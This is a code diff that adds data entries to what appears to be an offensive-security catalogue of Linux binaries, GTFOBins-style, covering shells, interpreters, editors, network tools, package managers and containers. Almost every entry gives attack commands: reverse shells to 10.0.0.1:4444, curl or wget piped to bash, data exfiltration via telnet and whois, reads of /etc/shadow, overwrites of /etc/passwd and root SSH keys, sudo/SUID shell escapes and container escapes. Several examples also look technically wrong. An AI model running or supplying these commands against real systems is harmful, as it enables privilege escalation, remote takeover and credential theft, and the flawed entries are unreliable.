+            {name: "zsh", os: "linux", categories: ["execution", "suid"], desc: "Z shell", usage: "# Execute command\nzsh -c 'id'\n\n# SUID\n./zsh"},
+            {name: "ksh", os: "linux", categories: ["execution", "suid"], desc: "Korn shell", usage: "# Execute command\nksh -c 'id'\n\n# SUID\n./ksh -p"},
+            {name: "csh", os: "linux", categories: ["execution", "suid"], desc: "C shell", usage: "# Execute command\ncsh -c 'id'\n\n# SUID\n./csh -b"},
+            {name: "tcsh", os: "linux", categories: ["execution", "suid"], desc: "TENEX C shell", usage: "# Execute command\ntcsh -c 'id'\n\n# SUID\n./tcsh -b"},
+
+            // Linux - Programming Languages
+            {name: "python", os: "linux", categories: ["execution", "download", "suid", "sudo", "file-read", "file-write"], desc: "Python interpreter for scripting and reverse shells.", usage: "# Reverse shell\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n# SUID file read\n./python -c 'print(open(\"/etc/shadow\").read())'\n\n# File write\npython -c 'open(\"/tmp/test\",\"w\").write(\"data\")'\n\n# Sudo\nsudo python -c 'import os; os.system(\"/bin/bash\")'"},
+            {name: "python3", os: "linux", categories: ["execution", "download", "suid", "sudo", "file-read", "file-write"], desc: "Python 3 interpreter", usage: "# Reverse shell\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n\n# SUID\n./python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n\n# Sudo\nsudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"},
+            {name: "php", os: "linux", categories: ["execution", "download", "suid", "sudo", "file-read", "file-write"], desc: "PHP interpreter for command execution and reverse shells.", usage: "# Reverse shell\nphp -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n\n# SUID file read\n./php -r 'echo file_get_contents(\"/etc/shadow\");'\n\n# Sudo\nsudo php -r 'system(\"/bin/bash\");'"},
+            {name: "perl", os: "linux", categories: ["execution", "suid", "sudo", "file-read", "file-write", "capabilities"], desc: "Perl interpreter for scripting and reverse shells.", usage: "# Reverse shell\nperl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'\n\n# SUID\n./perl -e 'exec \"/bin/bash\"'\n\n# Capabilities\n./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\"'"},
+            {name: "ruby", os: "linux", categories: ["execution", "suid", "sudo", "file-read", "file-write"], desc: "Ruby interpreter for command execution and reverse shells.", usage: "# Reverse shell\nruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'\n\n# SUID\n./ruby -e 'exec \"/bin/bash\"'\n\n# File read\nruby -e 'puts File.read(\"/etc/shadow\")'\n\n# Sudo\nsudo ruby -e 'exec \"/bin/bash\"'"},
+            {name: "node", os: "linux", categories: ["execution", "suid", "sudo", "file-read", "file-write", "capabilities"], desc: "Node.js JavaScript runtime", usage: "# Reverse shell\nnode -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/bash\",[]);var client=new net.Socket();client.connect(4444,\"10.0.0.1\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})();'\n\n# SUID\n./node -e 'require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0, 1, 2]})'\n\n# Capabilities\n./node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/bash\", {stdio: [0, 1, 2]})'"},
+            {name: "lua", os: "linux", categories: ["execution", "suid", "sudo", "file-read", "file-write"], desc: "Lua scripting language", usage: "# Execute command\nlua -e 'os.execute(\"/bin/bash\")'\n\n# SUID\n./lua -e 'os.execute(\"/bin/bash\")'\n\n# File read\nlua -e 'print(io.open(\"/etc/shadow\"):read(\"*a\"))'\n\n# Sudo\nsudo lua -e 'os.execute(\"/bin/bash\")'"},
+
+            // Linux - Text Processing
+            {name: "awk", os: "linux", categories: ["execution", "file-read", "suid", "sudo"], desc: "Pattern scanning and processing language.", usage: "# Execute command\nawk 'BEGIN {system(\"/bin/bash\")}'\n\n# SUID file read\n./awk '//' /etc/shadow\n\n# Sudo\nsudo awk 'BEGIN {system(\"/bin/bash\")}'"},
+            {name: "sed", os: "linux", categories: ["execution", "file-read", "file-write", "suid", "sudo"], desc: "Stream editor", usage: "# Execute command (GNU sed)\nsed -n '1e /bin/bash' /etc/hosts\n\n# File read\nsed '' /etc/shadow\n\n# File write\nsed -i '1s/^/evil\\n/' /etc/passwd\n\n# Sudo\nsudo sed -n '1e /bin/bash' /etc/hosts"},
+            {name: "grep", os: "linux", categories: ["file-read", "suid"], desc: "Search text patterns", usage: "# File read\ngrep '' /etc/shadow\n\n# SUID\n./grep '' /etc/shadow"},
+            {name: "egrep", os: "linux", categories: ["file-read", "suid"], desc: "Extended grep", usage: "# File read\negrep '' /etc/shadow\n\n# SUID\n./egrep '' /etc/shadow"},
+            {name: "fgrep", os: "linux", categories: ["file-read", "suid"], desc: "Fixed string grep", usage: "# File read\nfgrep '' /etc/shadow\n\n# SUID\n./fgrep '' /etc/shadow"},
+            {name: "cut", os: "linux", categories: ["file-read", "suid"], desc: "Cut out selected portions of each line", usage: "# File read\ncut -d '' -f1 /etc/shadow\n\n# SUID\n./cut -d '' -f1 /etc/shadow"},
+            {name: "paste", os: "linux", categories: ["file-read", "suid"], desc: "Merge lines of files", usage: "# File read\npaste /etc/shadow\n\n# SUID\n./paste /etc/shadow"},
+            {name: "diff", os: "linux", categories: ["file-read", "suid"], desc: "Compare files line by line", usage: "# File read\ndiff --line-format=%L /dev/null /etc/shadow\n\n# SUID\n./diff --line-format=%L /dev/null /etc/shadow"},
+
+            // Linux - Editors
+            {name: "vim", os: "linux", categories: ["execution", "bypass", "file-read", "file-write", "suid", "sudo", "library-load"], desc: "Vi IMproved editor, can be used to escape to a shell.", usage: "# Escape to shell\nvim -c ':!/bin/bash'\n\n# SUID file read\n./vim /etc/shadow\n\n# File write\nvim -c ':w /tmp/test' -c ':q!'\n\n# Library load\nvim -c ':py import os; os.setuid(0); os.system(\"/bin/bash\")'\n\n# Sudo\nsudo vim -c ':!/bin/bash'"},
+            {name: "vi", os: "linux", categories: ["execution", "bypass", "file-read", "file-write", "suid", "sudo"], desc: "Visual editor", usage: "# Escape to shell\nvi\n:!/bin/bash\n\n# SUID\n./vi -c ':!/bin/bash'\n\n# Sudo\nsudo vi -c ':!/bin/bash'"},
+            {name: "nano", os: "linux", categories: ["execution", "file-read", "file-write", "suid", "sudo"], desc: "Nano editor", usage: "# Execute command\nnano\n^R^X\nreset; bash 1>&0 2>&0\n\n# SUID file read\n./nano /etc/shadow\n\n# Sudo\nsudo nano\n^R^X\nreset; bash 1>&0 2>&0"},
+            {name: "pico", os: "linux", categories: ["execution", "file-read", "file-write", "suid", "sudo"], desc: "Simple text editor", usage: "# Execute command\npico\n^R^X\nreset; bash 1>&0 2>&0\n\n# SUID\n./pico /etc/shadow"},
+            {name: "emacs", os: "linux", categories: ["execution", "file-read", "file-write", "suid", "sudo"], desc: "Extensible text editor", usage: "# Execute shell\nemacs -Q -nw --eval '(term \"/bin/bash\")'\n\n# SUID\n./emacs -Q -nw --eval '(term \"/bin/bash\")'\n\n# Sudo\nsudo emacs -Q -nw --eval '(term \"/bin/bash\")'"},
+            {name: "ed", os: "linux", categories: ["execution", "file-read", "file-write", "suid"], desc: "Line-oriented text editor", usage: "# Execute command\ned\n!/bin/bash\n\n# File read\ned /etc/shadow\n,p\n\n# SUID\n./ed\n!/bin/bash"},
+
+            // Linux - File Operations
+            {name: "cat", os: "linux", categories: ["file-read", "suid"], desc: "Concatenate files", usage: "# File read\ncat /etc/shadow\n\n# SUID\n./cat /etc/shadow"},
+            {name: "tac", os: "linux", categories: ["file-read", "suid"], desc: "Concatenate files in reverse", usage: "# File read\ntac /etc/shadow\n\n# SUID\n./tac /etc/shadow"},
+            {name: "head", os: "linux", categories: ["file-read", "suid"], desc: "Output first part of files", usage: "# File read\nhead -n 100 /etc/shadow\n\n# SUID\n./head -n 100 /etc/shadow"},
+            {name: "tail", os: "linux", categories: ["file-read", "suid"], desc: "Output last part of files", usage: "# File read\ntail -n 100 /etc/shadow\n\n# SUID\n./tail -f /var/log/auth.log"},
+            {name: "more", os: "linux", categories: ["execution", "file-read", "suid", "sudo"], desc: "File pager", usage: "# Shell escape\nmore /etc/passwd\n!/bin/bash\n\n# SUID file read\n./more /etc/shadow\n\n# Sudo\nsudo more /etc/passwd\n!/bin/bash"},
+            {name: "less", os: "linux", categories: ["execution", "file-read", "suid", "sudo"], desc: "File pager", usage: "# Shell escape\nless /etc/passwd\n!/bin/bash\n\n# SUID file read\n./less /etc/shadow\n\n# Sudo\nsudo less /etc/passwd\n!/bin/bash"},
+            {name: "sort", os: "linux", categories: ["file-read", "suid"], desc: "Sort lines of text files", usage: "# File read\nsort /etc/shadow\n\n# SUID\n./sort /etc/shadow"},
+            {name: "uniq", os: "linux", categories: ["file-read", "suid"], desc: "Report or omit repeated lines", usage: "# File read\nuniq /etc/shadow\n\n# SUID\n./uniq /etc/shadow"},
+            {name: "strings", os: "linux", categories: ["file-read", "suid"], desc: "Print strings of printable characters", usage: "# File read\nstrings /etc/shadow\n\n# Binary analysis\nstrings /usr/bin/passwd"},
+            {name: "od", os: "linux", categories: ["file-read", "suid"], desc: "Dump files in octal and other formats", usage: "# File read\nod -c /etc/shadow\n\n# SUID\n./od -c /etc/shadow"},
+            {name: "xxd", os: "linux", categories: ["file-read", "file-write", "suid"], desc: "Hex dump", usage: "# File read\nxxd /etc/shadow\n\n# File write\necho data | xxd | xxd -r > /tmp/file\n\n# SUID\n./xxd /etc/shadow"},
+            {name: "base64", os: "linux", categories: ["file-read", "suid"], desc: "Base64 encode/decode", usage: "# File read\nbase64 /etc/shadow\n\n# SUID\n./base64 /etc/shadow | base64 -d"},
+            {name: "base32", os: "linux", categories: ["file-read", "suid"], desc: "Base32 encode/decode", usage: "# File read\nbase32 /etc/shadow\n\n# SUID\n./base32 /etc/shadow | base32 -d"},
+
+            // Linux - Archive and Compression
+            {name: "tar", os: "linux", categories: ["bypass", "file-read", "file-write", "suid", "sudo"], desc: "Archive utility", usage: "# Archive with command execution\ntar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash\n\n# File read\ntar xf archive.tar -O\n\n# SUID\n./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash\n\n# Sudo\nsudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"},
+            {name: "gzip", os: "linux", categories: ["file-read", "suid"], desc: "Compress files", usage: "# File read\ngzip -c /etc/shadow | gzip -d\n\n# SUID\n./gzip -c /etc/shadow | gzip -d"},
+            {name: "bzip2", os: "linux", categories: ["file-read", "suid"], desc: "Block-sorting file compressor", usage: "# File read\nbzip2 -c /etc/shadow | bzip2 -d\n\n# SUID\n./bzip2 -c /etc/shadow | bzip2 -d"},
+            {name: "zip", os: "linux", categories: ["execution", "file-read", "file-write", "suid", "sudo"], desc: "Package and compress files", usage: "# Execute on unzip\nzip payload.zip payload.sh -T -TT 'sh #'\n\n# File read\nzip - /etc/shadow | cat\n\n# SUID\n./zip - /etc/shadow | cat\n\n# Sudo\nsudo zip payload.zip payload.sh -T -TT 'sh #'"},
+            {name: "7z", os: "linux", categories: ["file-read", "file-write", "suid"], desc: "7-Zip archiver", usage: "# File read with password\n7z a -p archive.7z /etc/shadow\n7z x -so archive.7z\n\n# SUID\n./7z x -so archive.7z"},
+            {name: "ar", os: "linux", categories: ["file-read", "file-write", "suid"], desc: "Create, modify, and extract from archives", usage: "# File read\nar r archive.ar /etc/shadow\nar p archive.ar\n\n# SUID\n./ar p archive.ar"},
+            {name: "cpio", os: "linux", categories: ["file-read", "file-write", "suid", "sudo"], desc: "Copy files to and from archives", usage: "# File read\necho /etc/shadow | cpio -o | cpio -idmv\n\n# SUID\necho /etc/shadow | ./cpio -o | cpio -idmv\n\n# Sudo\nsudo echo /etc/shadow | cpio -o | cpio -idmv"},
+
+            // Linux - Network Tools
+            {name: "nc", os: "linux", categories: ["execution", "download", "network", "suid", "sudo"], desc: "Netcat - TCP/IP swiss army knife.", usage: "# Reverse shell\nnc -e /bin/bash 10.0.0.1 4444\n\n# File transfer (receive)\nnc -l -p 4444 > received_file\n\n# SUID\n./nc -e /bin/bash 10.0.0.1 4444\n\n# Sudo\nsudo nc -e /bin/bash 10.0.0.1 4444"},
+            {name: "ncat", os: "linux", categories: ["execution", "download", "network", "suid", "sudo"], desc: "Modern reimplementation of netcat", usage: "# Reverse shell\nncat 10.0.0.1 4444 -e /bin/bash\n\n# SSL reverse shell\nncat --ssl 10.0.0.1 4444 -e /bin/bash\n\n# SUID\n./ncat 10.0.0.1 4444 -e /bin/bash"},
+            {name: "socat", os: "linux", categories: ["execution", "download", "network", "suid", "sudo"], desc: "Multipurpose relay for bidirectional data transfer.", usage: "# Reverse shell\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444\n\n# File transfer\nsocat TCP4-LISTEN:4444,reuseaddr file:secret.txt\n\n# SUID\n./socat exec:'bash -li' tcp:10.0.0.1:4444\n\n# Sudo\nsudo socat exec:'bash -li' tcp:10.0.0.1:4444"},
+            {name: "wget", os: "linux", categories: ["download", "file-write", "suid", "sudo"], desc: "Web downloader for retrieving files.", usage: "# Download file\nwget http://10.0.0.1/payload.sh\n\n# Download and execute\nwget -O - http://10.0.0.1/payload.sh | bash\n\n# SUID file write\n./wget http://10.0.0.1/authorized_keys -O /root/.ssh/authorized_keys\n\n# Sudo\nsudo wget http://10.0.0.1/payload.sh -O /tmp/payload.sh"},
+            {name: "curl", os: "linux", categories: ["download", "file-write", "suid", "sudo"], desc: "Transfer data from or to a server.", usage: "# Download file\ncurl -o payload.sh http://10.0.0.1/payload.sh\n\n# Execute from memory\ncurl -s http://10.0.0.1/payload.sh | bash\n\n# SUID file write\n./curl http://10.0.0.1/data -o /etc/passwd\n\n# Sudo\nsudo curl http://10.0.0.1/payload.sh | sudo bash"},
+            {name: "ftp", os: "linux", categories: ["download", "file-write", "sudo"], desc: "File Transfer Protocol client", usage: "# Download file\nftp -n 10.0.0.1 <<EOF\nuser anonymous anonymous\nget payload.sh\nquit\nEOF\n\n# Sudo shell escape\nsudo ftp\n!/bin/bash"},
+            {name: "tftp", os: "linux", categories: ["download", "file-write", "suid"], desc: "Trivial File Transfer Protocol client", usage: "# Download file\ntftp 10.0.0.1 -c get payload.sh\n\n# Upload file\ntftp 10.0.0.1 -c put /etc/passwd"},
+            {name: "ssh", os: "linux", categories: ["execution", "download", "network", "sudo"], desc: "Secure shell client for remote access and file transfer.", usage: "# Remote command execution\nssh user@10.0.0.1 'id'\n\n# ProxyCommand execution\nssh -o ProxyCommand='bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' x\n\n# Sudo\nsudo ssh -o PermitLocalCommand=yes -o LocalCommand='/bin/bash' localhost"},
+            {name: "scp", os: "linux", categories: ["download", "file-write", "sudo"], desc: "Secure copy for transferring files over SSH.", usage: "# Download file\nscp user@10.0.0.1:/path/to/remote/file ./local/path\n\n# Upload file\nscp ./local/file user@10.0.0.1:/remote/path/\n\n# Sudo\nsudo scp user@10.0.0.1:/etc/shadow /tmp/shadow"},
+            {name: "rsync", os: "linux", categories: ["download", "file-write", "suid", "sudo"], desc: "Fast file copying tool", usage: "# Download files\nrsync -av user@10.0.0.1:/path/to/files/ ./\n\n# SUID shell\n./rsync -e 'bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"' /dev/null 127.0.0.1:/dev/null\n\n# Sudo\nsudo rsync -e 'bash -c \"bash -i\"' /dev/null 127.0.0.1:/dev/null"},
+            {name: "telnet", os: "linux", categories: ["execution", "network"], desc: "Telnet client", usage: "# Reverse shell\ntelnet 10.0.0.1 4444 | /bin/bash | telnet 10.0.0.1 4445\n\n# Exfiltrate data\ntelnet 10.0.0.1 4444 < /etc/passwd"},
+            {name: "whois", os: "linux", categories: ["file-read", "file-write"], desc: "WHOIS client", usage: "# File upload/exfiltration\nwhois -h 10.0.0.1 -p 4444 \"`cat /etc/passwd`\"\n\n# File download\nwhois -h 10.0.0.1 -p 4444 > received.txt"},
+
+            // Linux - File Search and Processing
+            {name: "find", os: "linux", categories: ["execution", "bypass", "file-read", "file-write", "suid", "sudo"], desc: "Search for files. Can execute commands on found files.", usage: "# Execute command\nfind . -exec /bin/bash \\; -quit\n\n# SUID shell\n./find . -exec /bin/bash -p \\; -quit\n\n# File write\nfind . -exec cp /bin/bash /tmp/bash \\; -quit\n\n# Sudo\nsudo find . -exec /bin/bash \\; -quit"},
+            {name: "xargs", os: "linux", categories: ["execution", "file-read", "suid", "sudo"], desc: "Build and execute command lines", usage: "# Execute command\necho x | xargs -I {} /bin/bash -c 'exec /bin/bash 0<&1'\n\n# File read\n./xargs -a /etc/shadow -I {} echo {}\n\n# Sudo\necho x | sudo xargs -I {} /bin/bash -c 'exec /bin/bash 0<&1'"},
+
+            // Linux - System Information and Process Management
+            {name: "env", os: "linux", categories: ["execution", "suid", "sudo"], desc: "Run a program in a modified environment", usage: "# Execute command\nenv /bin/bash\n\n# SUID\n./env /bin/bash -p\n\n# Sudo\nsudo env /bin/bash"},
+            {name: "nice", os: "linux", categories: ["execution", "suid", "sudo"], desc: "Run a program with modified scheduling priority", usage: "# Execute command\nnice /bin/bash\n\n# SUID\n./nice /bin/bash -p\n\n# Sudo\nsudo nice /bin/bash"},
+            {name: "stdbuf", os: "linux", categories: ["execution", "suid", "sudo"], desc: "Run command with modified buffering operations", usage: "# Execute command\nstdbuf -i0 /bin/bash\n\n# SUID\n./stdbuf -i0 /bin/bash -p\n\n# Sudo\nsudo stdbuf -i0 /bin/bash"},
+            {name: "timeout", os: "linux", categories: ["execution", "suid", "sudo"], desc: "Run a command with a time limit", usage: "# Execute command\ntimeout 7d /bin/bash\n\n# SUID\n./timeout 7d /bin/bash -p\n\n# Sudo\nsudo timeout --foreground 7d /bin/bash"},
+            {name: "watch", os: "linux", categories: ["execution", "suid", "sudo"], desc: "Execute a program periodically", usage: "# Execute command\nwatch -x /bin/bash -c 'exec /bin/bash 0<&1'\n\n# SUID\n./watch -x /bin/bash -p -c 'exec /bin/bash 0<&1'\n\n# Sudo\nsudo watch -x /bin/bash -c 'exec /bin/bash 0<&1'"},
+            {name: "time", os: "linux", categories: ["execution", "suid", "sudo"], desc: "Time a simple command", usage: "# Execute command\n/usr/bin/time /bin/bash\n\n# SUID\n./time /bin/bash -p\n\n# Sudo\nsudo /usr/bin/time /bin/bash"},
+            {name: "strace", os: "linux", categories: ["execution", "file-read", "suid", "sudo"], desc: "Trace system calls", usage: "# Execute command\nstrace -o /dev/null /bin/bash\n\n# File read\nstrace -s 999 -e read cat /etc/shadow 2>&1 | grep -oE '\".*\"' | sed 's/\"//g'\n\n# SUID\n./strace -o /dev/null /bin/bash -p"},
+            {name: "ltrace", os: "linux", categories: ["execution", "file-read", "suid", "sudo"], desc: "Library call tracer", usage: "# Execute command\nltrace -L /bin/bash\n\n# File read strings\nltrace -s 999 -e getline cat /etc/shadow\n\n# Sudo\nsudo ltrace -L /bin/bash"},
+
+            // Linux - Service Management
+            {name: "systemctl", os: "linux", categories: ["persistence", "bypass", "file-write", "sudo", "suid"], desc: "Service manager, can be used to create or modify services to run as root.", usage: "# Create malicious service\nTF=$(mktemp).service\necho '[Service]\nType=oneshot\nExecStart=/bin/bash -c \"id > /tmp/output\"\n[Install]\nWantedBy=multi-user.target' > $TF\nsudo systemctl link $TF\nsudo systemctl enable --now $TF\n\n# SUID\n./systemctl"},
+            {name: "service", os: "linux", categories: ["execution", "sudo"], desc: "Run a System V init script", usage: "# Sudo execution\nsudo service ../../bin/bash"},
+
+            // Linux - Development Tools
+            {name: "git", os: "linux", categories: ["execution", "file-read", "file-write", "suid", "sudo"], desc: "Version control system can be abused to run shell commands.", usage: "# Shell via pager\ngit help config\n!/bin/bash\n\n# Shell via hooks\ngit init\necho '/bin/bash' > .git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\ngit commit --allow-empty -m x\n\n# SUID\n./git help config\n!/bin/bash\n\n# Sudo\nsudo git -p help config\n!/bin/bash"},
+            {name: "make", os: "linux", categories: ["execution", "file-write", "suid", "sudo"], desc: "Build automation tool", usage: "# Execute command\nmake -s --eval=$'x:\\n\\t/bin/bash -p'\n\n# File write\nmake -s --eval=$'x:\\n\\t$(file>/tmp/test,data)' 2>/dev/null\n\n# SUID\n./make -s --eval=$'x:\\n\\t/bin/bash -p'"},
+            {name: "gcc", os: "linux", categories: ["execution", "file-write", "sudo"], desc: "GNU Compiler Collection", usage: "# Compile and execute\ngcc -wrapper /bin/bash,-s .\n\n# Sudo\nsudo gcc -wrapper /bin/bash,-s ."},
+            {name: "as", os: "linux", categories: ["file-read", "suid", "sudo"], desc: "GNU assembler", usage: "# File read\nas /etc/shadow -o /dev/null\n\n# SUID\n./as /etc/shadow -o /dev/null"},
+            {name: "ld", os: "linux", categories: ["file-read", "suid", "sudo"], desc: "GNU linker", usage: "# File read\nld -o /dev/null -script /etc/shadow\n\n# SUID\n./ld -o /dev/null -script /etc/shadow"},
+
+            // Linux - Debuggers
+            {name: "gdb", os: "linux", categories: ["execution", "bypass", "file-read", "file-write", "suid", "sudo", "capabilities"], desc: "GNU debugger", usage: "# Execute command\ngdb -nx -ex '!id' -ex quit\n\n# Shell escape\ngdb -nx -ex '!bash' -ex quit\n\n# Python payload\ngdb -nx -ex 'python import os; os.system(\"id\")' -ex quit\n\n# SUID\n./gdb -nx -ex 'python import os; os.setuid(0); os.system(\"/bin/bash\")' -ex quit\n\n# Capabilities\n./gdb -nx -ex 'python import os; os.setuid(0); os.system(\"/bin/bash\")' -ex quit"},
+            {name: "lldb", os: "linux", categories: ["execution", "file-read", "sudo"], desc: "LLDB debugger", usage: "# Execute command\nlldb -o 'platform shell id' -b\n\n# Sudo\nsudo lldb -o 'platform shell /bin/bash' -b"},
+
+            // Linux - Databases
+            {name: "sqlite3", os: "linux", categories: ["execution", "file-read", "file-write", "suid", "sudo"], desc: "SQLite database", usage: "# Execute command\nsqlite3 /dev/null '.shell /bin/bash'\n\n# File read\nsqlite3 << EOF\nCREATE TABLE t(line TEXT);\n.import /etc/passwd t\nSELECT * FROM t;\nEOF\n\n# SUID\n./sqlite3 /dev/null '.shell /bin/bash -p'"},
+            {name: "mysql", os: "linux", categories: ["execution", "sudo", "library-load"], desc: "MySQL client", usage: "# Execute command\nmysql -e '\\! /bin/bash'\n\n# Library load for root\nmysql -e 'SELECT * FROM information_schema.tables' --plugin-dir=/tmp --default-auth=../../../../../../bin/bash\n\n# Sudo\nsudo mysql -e '\\! /bin/bash'"},
+            {name: "psql", os: "linux", categories: ["execution", "file-read", "sudo"], desc: "PostgreSQL client", usage: "# Execute command\npsql -c 'COPY (SELECT '''') to program ''id'''\n\n# File read\npsql -c \"COPY file_data FROM '/etc/passwd'\"\n\n# Sudo\nsudo psql -c 'COPY (SELECT '''') to program ''/bin/bash'''"},
+
+            // Linux - Package Managers
+            {name: "apt", os: "linux", categories: ["execution", "sudo"], desc: "Debian package manager", usage: "# Pre-invoke shell\nsudo apt update -o APT::Update::Pre-Invoke::=/bin/bash\n\n# Changelog escape\nsudo apt changelog apt\n!/bin/bash"},
+            {name: "apt-get", os: "linux", categories: ["execution", "sudo"], desc: "Debian package manager", usage: "# Pre-invoke shell\nsudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash\n\n# Changelog escape\nsudo apt-get changelog apt\n!/bin/bash"},
+            {name: "dpkg", os: "linux", categories: ["execution", "sudo"], desc: "Debian package manager", usage: "# Execute via hook\nsudo dpkg -i /dev/null --pre-invoke=/bin/bash"},
+            {name: "rpm", os: "linux", categories: ["execution", "sudo"], desc: "RPM package manager", usage: "# Execute via plugin\nsudo rpm --eval '%{lua:os.execute(\"/bin/bash\")}'"},
+            {name: "yum", os: "linux", categories: ["execution", "sudo"], desc: "YUM package manager", usage: "# Plugin execution\nsudo yum install -y --enableplugin=/bin/bash x"},
+            {name: "dnf", os: "linux", categories: ["execution", "sudo"], desc: "DNF package manager", usage: "# Plugin execution\nsudo dnf install -y --enableplugin=/bin/bash x"},
+            {name: "pip", os: "linux", categories: ["execution", "file-write", "sudo"], desc: "Python package installer", usage: "# Download and execute\nTF=$(mktemp -d)\necho 'import os; os.system(\"/bin/bash\")' > $TF/setup.py\nsudo pip install $TF\n\n# Sudo\nsudo pip install -r /dev/stdin <<< 'import os; os.system(\"/bin/bash\")'"},
+            {name: "pip3", os: "linux", categories: ["execution", "file-write", "sudo"], desc: "Python 3 package installer", usage: "# Download and execute\nTF=$(mktemp -d)\necho 'import os; os.system(\"/bin/bash\")' > $TF/setup.py\nsudo pip3 install $TF"},
+            {name: "gem", os: "linux", categories: ["execution", "sudo"], desc: "Ruby package manager", usage: "# Execute via gem open\nsudo gem open -e '/bin/bash -c /bin/bash' rdoc\n\n# Execute during install\nsudo gem install --pre-install '/bin/bash -c /bin/bash' x"},
+            {name: "npm", os: "linux", categories: ["execution", "sudo"], desc: "Node.js package manager", usage: "# Execute via preinstall\nTF=$(mktemp -d)\necho '{\"scripts\": {\"preinstall\": \"/bin/bash\"}}' > $TF/package.json\nsudo npm install $TF"},
+            {name: "cpan", os: "linux", categories: ["execution", "sudo"], desc: "Perl module installer", usage: "# Execute command\nsudo cpan\n! /bin/bash"},
+
+            // Linux - System Utilities with SUID/Capabilities
+            {name: "dd", os: "linux", categories: ["file-read", "file-write", "suid"], desc: "Convert and copy files", usage: "# File read\n./dd if=/etc/shadow\n\n# File write\necho \"data\" | ./dd of=/tmp/output"},
+            {name: "cp", os: "linux", categories: ["file-read", "file-write", "suid"], desc: "Copy files", usage: "# SUID file read\n./cp /etc/shadow /tmp/shadow\n\n# Overwrite file\n./cp /bin/bash /tmp/bash"},
+            {name: "mv", os: "linux", categories: ["file-write", "suid"], desc: "Move files", usage: "# SUID file write\n./mv /tmp/passwd /etc/passwd\n\n# Overwrite sensitive files\n./mv malicious.conf /etc/ld.so.preload"},
+            {name: "chmod", os: "linux", categories: ["suid", "capabilities"], desc: "Change file permissions", usage: "# SUID exploitation\n./chmod +s /bin/bash\n/bin/bash -p\n\n# Capabilities\n./chmod +s /bin/bash"},
+            {name: "chown", os: "linux", categories: ["suid", "capabilities"], desc: "Change file ownership", usage: "# SUID exploitation\n./chown root:root /tmp/bash\n./chmod +s /tmp/bash\n/tmp/bash -p\n\n# Capabilities\n./chown root:root /tmp/payload"},
+            {name: "setcap", os: "linux", categories: ["capabilities"], desc: "Set file capabilities", usage: "# Set capability on binary\nsetcap cap_setuid+ep /bin/bash\n/bin/bash -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"},
+
+            // Linux - Container Escapes
+            {name: "docker", os: "linux", categories: ["execution", "bypass", "suid", "sudo"], desc: "Container platform, misconfigurations can lead to root access.", usage: "# Privilege escalation via mounted volume\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n\n# Execute as root\ndocker run --rm -it --privileged ubuntu bash\n\n# SUID\n./docker run -v /:/mnt --rm -it alpine chroot /mnt sh"},
+            {name: "lxc", os: "linux", categories: ["execution", "bypass", "sudo"], desc: "Linux containers", usage: "# Privilege escalation\nlxc-attach -n container -f /etc/passwd\n\n# Execute command\nsudo lxc-execute -n container -- /bin/bash"},
+            {name: "lxd", os: "linux", categories: ["execution", "bypass", "sudo"], desc: "LXD container hypervisor", usage: "# Privilege escalation\nlxc image import alpine.tar.gz --alias alpine\nlxc init alpine privesc -c security.privileged=true\nlxc config device add privesc host-root disk source=/ path=/mnt/root\nlxc start privesc\nlxc exec privesc /bin/sh"},
+            {name: "runc", os: "linux", categories: ["execution", "bypass"], desc: "CLI tool for spawning containers", usage: "# Execute with high privileges\nrunc exec container_id /bin/bash"},
+
+            // Linux - Virtualization
+            {name: "virsh", os: "linux", categories: ["execution", "sudo"], desc: "Virtualization management", usage: "# Execute in VM console\nsudo virsh console vm_name\n\n# Escape characters: Ctrl+]"},
+            {name: "qemu", os: "linux", categories: ["execution", "sudo"], desc: "QEMU emulator", usage: "# Execute with monitor console\nsudo qemu-system-x86_64 -monitor stdio\n(qemu) shell /bin/bash"},
+
+            // Linux - Miscellaneous with Capabilities
+            {name: "openssl", os: "linux", categories: ["execution", "file-read", "file-write", "capabilities"], desc: "Cryptography toolkit", usage: "# File read\nopenssl enc -in /etc/shadow\n\n# File write\necho data | openssl enc -out /tmp/file\n\n# Capabilities with library load\n./openssl req -engine /lib/x86_64-linux-gnu/openssl-1.0.2/engines/payload.so"},
+            {name: "nmap", os: "linux", categories: ["execution", "file-write", "sudo", "capabilities"], desc: "Network scanner that can execute scripts.", usage: "# NSE script execution\nnmap --script vuln 127.0.0.1\n\n# Interactive mode shell escape (old versions)\nnmap --interactive\n!sh\n\n# Sudo\nsudo nmap --script /tmp/shell.nse localhost"},
